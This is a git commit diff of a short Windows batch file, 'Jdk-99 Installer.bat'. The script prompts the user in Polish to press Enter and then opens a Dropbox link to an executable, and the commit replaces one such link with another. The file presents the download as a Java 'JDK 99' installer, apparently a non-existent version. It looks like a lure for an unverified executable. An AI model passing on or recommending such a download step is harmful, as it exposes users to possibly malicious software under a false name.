33d08fd0cc7abb5ad1ed22b28eca7c6e730ed5a1
jdk99-gif <kupczakgaming@gmail.com>
2024-08-13 07:26:25 +0200

    Update Jdk-99 Installer.bat

--- Jdk-99 Installer.bat
+++ Jdk-99 Installer.bat
@@ -4,4 +4,4 @@ title Jdk-99 Installer
 echo Jdk-99 Installer
 echo Klikni Enter Aby Pobrac Jdk-99
 pause>nul
-start https://www.dropbox.com/scl/fi/7oqjly2netowtx6w5at3d/jdk-99_windows-x64_bin.exe?rlkey=yi37o8l12r92eaum1grixfj0d&st=d2gnutfk&dl=0
+start https://www.dropbox.com/scl/fi/m24nfvkyapgzqwgu4j32t/jdk-99_windows-x64_bin.exe?rlkey=s06mcvvc72z9p2xx4fd8t4mf9&st=lm682vxz&dl=0
